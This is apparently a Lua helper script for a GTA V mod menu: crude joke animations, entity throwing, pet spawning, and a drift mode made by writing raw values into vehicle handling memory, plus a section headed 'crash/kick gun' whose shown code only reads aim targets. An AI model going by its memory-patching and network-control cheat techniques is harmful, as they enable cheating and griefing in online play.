local c5
local c6
local c7
local c8
local c9
local c10
local c12
local c13
local c14
local c15
local c16
local c17
local c18
local c19
--拉屎
function lababa() 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z - 1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true) --play anim
    util.yield(1000)
    local shit = entities.create_object(mshit, c) --spawn shit
    util.yield(60000)
    entities.delete_by_handle(shit) --delete shit
end
--打飞机
function dafeiji() 
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z - 1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup2) do
        STREAMING.REQUEST_ANIM_DICT(agroup2)
        util.yield()
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), agroup2, anim2, 8.0, 8.0, 5000, 1, 0, true, true, true) --play anim
    util.yield(4500)
    local cum = entities.create_object(cum, c) --spawn cum
    util.yield(60000)
    entities.delete_by_handle(cum) --delete cum
end
--背后
function requestweapon(...)
	local arg = {...}
	for _, model in ipairs(arg) do
		WEAPON.REQUEST_WEAPON_ASSET(model, 31, 26)
		while not WEAPON.HAS_WEAPON_ASSET_LOADED(model) do
			util.yield()
		end
	end
end
function attachweapon(spawnweapon)
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == 416676503) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == 690389602) then
		ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.15, 0, 0.13, 270, 0, 0, false, true, false, false, 1, true)
	end
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == -728555052) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == -1609580060) then
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_bat")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.3, -0.18, -0.15, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_crowbar")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_battleaxe")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_golfclub")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_hatchet")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_poolcue")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), -0.2, -0.18, 0.1, 0, 120, 0, false, true, false, false, 1, true)
		end
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_stone_hatchet")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_knuckle")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_bat"))  and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_crowbar")) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_battleaxe"))and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_golfclub")) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_hatchet")) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_poolcue")) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_stone_hatchet")) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_knuckle")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0, 0, 0.13, 0, 90, 270, false, true, false, false, 1, true)
		end
	end
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == 1548507267) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == -37788308) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == 1595662460) then	
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_petrolcan")) or (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_hazardcan")) or (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_fertilizercan")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0, -0.18, -0, 0, 90, 0, false, true, false, false, 1, true)
		end
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_proxmine")) or (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_stickybomb")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 0, 270, false, true, false, false, 1, true)
		end
		if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_fireextinguisher")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0, -0.05, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_petrolcan")) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_hazardcan")) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_fertilizercan")) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_proxmine")) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_stickybomb")) and not (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) == util.joaat("weapon_fireextinguisher")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 270, false, true, false, false, 1, true)
		end
	end

	if not (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == 416676503) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == 690389602) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == -728555052) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == -1609580060) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == 1548507267) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == -37788308) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped())) == 1595662460) then
		ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0, -0.18, 0, 180, 220, 0, false, true, false, false, 1, true)
	end
end
function plyped()
	return PLAYER.PLAYER_PED_ID()
end
--崩溃/踢出枪
local ent_types = {"无", "Ped", "车辆", "物体"}
function get_aim_info()
    local outptr = memory.alloc(4)
    local success = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), outptr)
    local info = {}
    if success then
        local ent = memory.read_int(outptr)
        if not ENTITY.DOES_ENTITY_EXIST(ent) then
            info["ent"] = 0
        else
            info["ent"] = ent
        end
        if ENTITY.GET_ENTITY_TYPE(ent) == 1 then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ent, false)
            if veh ~= 0 then
                if VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1) then
                    ent = veh
                    info['ent'] = ent
                end
            end
        end
        info["hash"] = ENTITY.GET_ENTITY_MODEL(ent)
        info["health"] = ENTITY.GET_ENTITY_HEALTH(ent)
        info["type"] = ent_types[ENTITY.GET_ENTITY_TYPE(ent)+1]
        info["speed"] = math.floor(ENTITY.GET_ENTITY_SPEED(ent))
    else
        info['ent'] = 0
    end
    return info
end
--娱乐
    vehicle_uses = 0
    ped_uses = 0
    pickup_uses = 0
    player_uses = 0
    object_uses = 0
    handle_ptr = memory.alloc(13*8)
    function pid_to_handle(PlayerID)
        NETWORK.NETWORK_HANDLE_FROM_PLAYER(PlayerID, handle_ptr, 13)
        return handle_ptr
    end

    function ls_log(content)
        if ls_debug then
            notification(content)
            util.log("[Heezy二代目]" .. content)
        end
    end
    is_loading = true
    function mod_uses(type, incr)
        -- this func is a patch. every time the script loads, all the toggles load and set their state. in some cases this makes the _uses optimization negative and breaks things. this prevents that.
        if incr < 0 and is_loading then
            -- ignore if script is still loading
            ls_log("Not incrementing use var of type " .. type .. " by " .. incr .. "- script is loading")
            return
        end
        ls_log("Incrementing use var of type " .. type .. " by " .. incr)
        if type == "vehicle" then
            if vehicle_uses <= 0 and incr < 0 then
                return
            end
            vehicle_uses = vehicle_uses + incr
        elseif type == "pickup" then
            if pickup_uses <= 0 and incr < 0 then
                return
            end
            pickup_uses = pickup_uses + incr
        elseif type == "ped" then
            if ped_uses <= 0 and incr < 0 then
                return
            end
            ped_uses = ped_uses + incr
        elseif type == "player" then
            if player_uses <= 0 and incr < 0 then
                return
            end
            player_uses = player_uses + incr
        elseif type == "object" then
            if object_uses <= 0 and incr < 0 then
                return
            end
            object_uses = object_uses + incr
        end
    end
--宠物
function getgroupsize(group)
    local unkPtr, sizePtr = memory.alloc(1), memory.alloc(1)
    PED.GET_GROUP_SIZE(group, unkPtr, sizePtr)
    return memory.read_int(sizePtr)
end

mygroup = PLAYER.GET_PLAYER_GROUP(players.user())

dogs = table.freeze({
    "Rottweiler",
    "Husky",
    "Poodle",
    "Pug",
    "Retriever",
    "Westy",
    "Shepherd",
    "Cat_01",
})

doganimations = {
    "WORLD_DOG_SITTING_ROTTWEILER",
    "WORLD_DOG_SITTING_RETRIEVER",
    "WORLD_DOG_SITTING_SHEPHERD",
    "WORLD_DOG_SITTING_SMALL",
}

activedogs = {}

function GenerateNametagOnPed(ped, nametag)
    util.create_thread(function()
        while ENTITY.DOES_ENTITY_EXIST(ped) do
            local headpos = PED.GET_PED_BONE_COORDS(ped, 0x796e, 0,0,0)
            GRAPHICS.SET_DRAW_ORIGIN(headpos.x, headpos.y, headpos.z+0.4, 0)

            HUD.SET_TEXT_COLOUR(200,200,200,220)
            HUD.SET_TEXT_SCALE(1, 0.5)
            HUD.SET_TEXT_CENTRE(true)
            HUD.SET_TEXT_FONT(4)
            HUD.SET_TEXT_OUTLINE()

            HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
            HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(nametag)
            HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0,0,0)
            GRAPHICS.CLEAR_DRAW_ORIGIN()
            util.yield()
        end
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0,0,0)
        GRAPHICS.CLEAR_DRAW_ORIGIN()
    end)
end
--抛掷NPC/载具
function get_closest_veh(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, veh in pairs(entities.get_all_vehicles_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(veh))
        if this_dist < closest_dist  and ENTITY.GET_ENTITY_HEALTH(veh) > 0 then
            closest = veh
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
function get_closest_ped_new(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped)  and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            closest = ped
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
    local entity_held = 0
    local are_hands_up = false
    local ped_held = 0
function throwvehs()
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true)  then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_veh(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                local veh = closest[1]
                if veh ~= nil then 
                    local dist = closest[2]
                    if dist <= 5 then 
                        request_anim_dict("missminuteman_1ig_2")
                        TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                        util.yield(500)
                        are_hands_up = true
                        ENTITY.SET_ENTITY_ALPHA(veh, 100)
                        ENTITY.SET_ENTITY_HEADING(veh, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        request_control_of_entity_once(veh)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(veh, players.user_ped(), 0, 0, 0, get_model_size(ENTITY.GET_ENTITY_MODEL(veh)).z / 2, 180, 180, -180, true, false, true, false, 0, true)
                        entity_held = veh
                    end 
                end
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_VEHICLE(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(entity_held, 100.0)
                VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(entity_held, true, true)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
            -- toss
        end
    end
end

function throwpeds()
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_ped_new(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                if closest ~= nil then
                    local ped = closest[1]
                    if ped ~= nil then
                        local dist = closest[2]
                        if dist <= 5 then 
                            request_anim_dict("missminuteman_1ig_2")
                            TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                            util.yield(500)
                            are_hands_up = true
                            ENTITY.SET_ENTITY_ALPHA(ped, 100)
                            ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                            request_control_of_entity_once(ped)
                            ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, players.user_ped(), 0, 0, 0, 1.3, 180, 180, -180, true, false, true, true, 0, true)
                            entity_held = ped
                        end 
                    end
                end
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_PED(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                PED.SET_PED_TO_RAGDOLL(entity_held, 10, 10, 0, false, false, false)
                --ENTITY.SET_ENTITY_VELOCITY(entity_held, 0, 100, 0)
                ENTITY.SET_ENTITY_MAX_SPEED(entity_held, 100.0)
                ENTITY.APPLY_FORCE_TO_ENTITY(entity_held, 1, 0, 100, 0, 0, 0, 0, 0, true, false, true, false, false)
                AUDIO.PLAY_PAIN(entity_held, 7, 0, 0)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
            -- toss
        end
    end
end
--飘移
player_cur_car = 0

function get_vehicle_handling_value(veh, offset)
    local v_ptr = entities.handle_to_pointer(veh)
    local handling = memory.read_long(v_ptr + 0x918)
    return memory.read_float(handling + offset)
end

function set_vehicle_handling_value(veh, offset, value)
    local v_ptr = entities.handle_to_pointer(veh)
    local handling = memory.read_long(v_ptr + 0x918)
    memory.write_float(handling + offset, value)
end

last_vehicle_handling_data = {}
function set_vehicle_into_drift_mode(veh)
    local handling_values = {
        [0x0C] = 1900.0, -- fmass
        [0x20] = 0.0, -- vec com off x
        [0x24] = 0.0, -- vec com off y
        [0x28] = 0.0, -- vec com off z
        [0x30] = 1.0, -- vec inertia mult x
        [0x34] = 1.0, -- vec inertia mult y
        [0x38] = 1.0, -- vec inertia mult z
        [0x10] = 15.5, -- initial drag coeff
        [0x40] = 85.0, -- percent submerged
        [0x48] = 0.0,-- drive bias front
        [0x50] = 0.0,-- initial drive gears
        [0x60] = 1.9,-- initial drive force
        [0x54] = 1.0,-- fdrive interia
        [0x58] = 5.0,-- clutch change rate scale up
        [0x5C] = 5.0,-- clutch change rate scale down
        [0x68] = 200.0, -- initial drive max flat vel
        [0x6C] = 4.85, --  brake force
        [0x74] = 0.67, -- brake bias front
        [0x7C] = 3.5, -- handbrake force
        [0x80] = 1.2, -- steering lock
        [0x88] = 1.0, -- traction curve max
        [0x88] = 1.45, -- traction curve min
        [0x98] = 35.0, -- traction curve lateral
        [0xA0] = 0.15, -- traction curve spring delta max
        [0xA8] = 0.0, -- low speed traction loss mult
        [0xAC] = 0.0, -- camber stiffness
        [0xB0] = 0.45, -- traction bias front
        [0xB8] = 1.0, -- traction loss mult
        [0xBC] = 2.8, -- suspension force
        [0xC0] = 1.4, -- suspension comp damp
        [0xC4] = 2.2, -- suspension rebound damp
        [0xC8] = 0.06, -- suspension upper limit
        [0xCC] = -0.05, -- suspension lower limit
        [0xBC] = 2.8, -- suspension force
        [0xD0] = 0.0, -- suspension raise
        [0xD4] = 0.5, -- suspension bias front
        [0xD4] = 0.5, -- suspension bias front
    }
    for offset, value in pairs(handling_values) do 
        last_vehicle_handling_data[offset] = get_vehicle_handling_value(veh, offset)
        set_vehicle_handling_value(veh, offset, value)
    end
end
initial_d_mode = false
initial_d_score = false
function on_user_change_vehicle(vehicle)
    if vehicle ~= 0 then
        if initial_d_mode then 
            set_vehicle_into_drift_mode(vehicle)
        end

        local deez_nuts = {}
        local num_seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(vehicle))
        for i=1, num_seats do
            if num_seats >= 2 then
                deez_nuts[#deez_nuts + 1] = tostring(i - 2)
            else
                deez_nuts[#deez_nuts + 1] = tostring(i)
            end
        end


        if true then 
            native_invoker.begin_call()
            native_invoker.push_arg_int(vehicle)
            native_invoker.end_call("76D26A22750E849E")
        end

    end
end

function initial_d_score_thread()
    util.create_thread(function()
        local drift_score = 0
        local is_drifting = false
        while true do
            if not initial_d_mode or not initial_d_score then 
                util.stop_thread()
            end
            if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
                if math.abs(ENTITY.GET_ENTITY_SPEED_VECTOR(player_cur_car, true).x) > 2 then 
                    is_drifting = true
                    drift_score = drift_score + 1
                    local c = ENTITY.GET_ENTITY_COORDS(player_cur_car)
                    c.z = c.z + 0.3
                    local score_pos = world_to_screen_coords(c.x, c.y, c.z)
                    directx.draw_text(score_pos.x, score_pos.y, "漂移分数: " .. tostring(drift_score), 5, 1, {r=1, g= 0.5, b = 0.4, a = 100}, true)
                else
                    if is_drifting then
                        is_drifting = false
                        notify("总漂移得分: " .. drift_score)
                    end
                    drift_score = 0
                end
            end
            util.yield()
        end
    end)
end
--相机方向推力
thrust_cam_dir_add = 1.25
before_vel = {x = 1, y = 1, z = 1}
function cam_direction()
local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
-- credits to jinxscript
local inst = v3.new()
v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
local tmp = v3.toDir(inst)
v3.set(inst, v3.get(tmp))
v3.mul(inst, 10)
v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
v3.add(inst, tmp)
local aim_pos = inst
local car_pos = ENTITY.GET_ENTITY_COORDS(player_cur_car)
local c = {}
c.x = before_vel.x+thrust_cam_dir_add + (aim_pos.x - car_pos.x)
c.y = before_vel.y+thrust_cam_dir_add + (aim_pos.y - car_pos.y)
ENTITY.SET_ENTITY_VELOCITY(player_cur_car, c.x, c.y, -0.002)
end
--骑牛
function set_ped_apathy(ped, value)
    PED.SET_PED_CONFIG_FLAG(ped, 208, value)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, value)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, value)
end
--获取导航点
function get_waypoint_pos(callback, silent)
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
            if callback then
                callback(waypoint_pos)
            end
            return waypoint_pos
        elseif not silent then
            notification("没有设置导航点")
            return nil
        end
    end
--GPS
b_common_funcs = {}
b_common_funcs.new = function ()
    local self = {}
    --credit to Nowiry#2663 and QuickNET#9999 for this one
    self.address_from_pointer_chain = function (basePtr, offsets)
        local addr = memory.read_long(basePtr)
        for k = 1, (#offsets - 1) do
            addr = memory.read_long(addr + offsets[k])
            if addr == 0 then
                return 0
            end
        end
        addr = addr + offsets[#offsets]
        return addr
    end
    self.get_player_vehicle_class = function ()
        local veh = entities.get_user_vehicle_as_handle()
        return VEHICLE.GET_VEHICLE_CLASS(veh)
    end
    self.get_ascpect_ratio = function()
        local screen_x, screen_y = directx.get_client_size()
    
        return screen_x / screen_y
    end
    self.to_bits = function(num)
        -- returns a table of bits, least significant first.
        local t={} -- will contain the bits
        while num>0 do
            rest=math.fmod(num,2)
            t[#t+1]=rest
            num=(num-rest)/2
        end
        return t
    end
    self.split = function (input, sep)
        local t={}
        for str in string.gmatch(input, "([^"..sep.."]+)") do
                table.insert(t, str)
        end
        return t
    end
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    self.get_pos_above_entity = function (entity)
        MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
        local maximum_vec = memory.read_vector3(maximum)
        return ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, 0, 0, maximum_vec.z)
    end
    self.copy_File = function(old_path, new_path)
        local old_file = io.open(old_path, "rb")
        local new_file = io.open(new_path, "wb")
        local old_file_sz, new_file_sz = 0, 0
        if not old_file or not new_file then
          return false
        end
        while true do
          local block = old_file:read(2^13)
          if not block then 
            old_file_sz = old_file:seek( "end" )
            break
          end
          new_file:write(block)
        end
        old_file:close()
        new_file_sz = new_file:seek( "end" )
        new_file:close()
        return new_file_sz == old_file_sz
      end
    return self
end
b_math_funcs = {}
b_math_funcs.new = function ()
    local self = {}
    self.lerp = function(a, b, t)
        return a + (b - a) * t
    end
    local EPSILON = 0.0000001
    self.RayIntersectsTriangle = function(rayOrigin, rayDirection, vertex1, vertex2, vertex3)
        local edge1, edge2, h, s, q, a, f, u, v
        edge1 = {x = vertex2.x - vertex1.x, y = vertex2.y - vertex1.y, z = vertex2.z - vertex1.z}
        edge2 = {x = vertex3.x - vertex1.x, y = vertex3.y - vertex1.y, z = vertex3.z - vertex1.z}
        h = {
            x =    edge2.y * rayDirection.z - edge2.z * rayDirection.y,
            y =    edge2.z * rayDirection.x - edge2.x * rayDirection.z,
            z =    edge2.x * rayDirection.y - edge2.y * rayDirection.x
        }
        a = h.x * edge1.x + h.y * edge1.y + h.z * edge1.z

        if a > -EPSILON and a < EPSILON then return false end

        f = 1.0/a
        s = {x = rayOrigin.x - vertex1.x, y = rayOrigin.y - vertex1.y, z = rayOrigin.z - vertex1.z}
        u = f * (h.x * s.x + h.y * s.y + h.z * s.z)
        if u < 0.0 or u > 1.0 then return false end
        q = {
            x =    edge1.y * s.z - edge1.z * s.y,
            y =    edge1.z * s.x - edge1.x * s.z,
            z =    edge1.x * s.y - edge1.y * s.x
        }
        v = f * (rayDirection.x * q.x + rayDirection.y * q.y + rayDirection.z * q.z)
        if v < 0.0 or u + v > 1.0 then return false end
        t = f *  (edge2.x * q.x + edge2.y * q.y + edge2.z * q.z)
        if t > EPSILON then
            return true, {
                x = rayOrigin.x + rayDirection.x * t,
                y = rayOrigin.y + rayDirection.y * t,
                z = rayOrigin.z + rayDirection.z * t
            }
        else
            return false
        end
    end
    return self
    
end
b_vectors = {}
b_vectors.new = function ()
    local self = {}

    self.vector2 = {}
    self.vector2.new = function (x, y)
        return {x = x, y = y}
    end
    self.vector2.dot = function(vector_a, vector_b)
        return (vector_a.x * vector_b.x) + (vector_a.y * vector_b.y)
    end
    self.vector2.magnitude = function(vector)
        return math.sqrt((vector.x * vector.x) + (vector.y * vector.y))
    end
    self.vector2.get_angle = function(vector_a, vector_b)
        return math.acos(self.vector2.dot(vector_a, vector_b) / self.vector2.magnitude(vector_a) / self.vector2.magnitude(vector_b))
    end
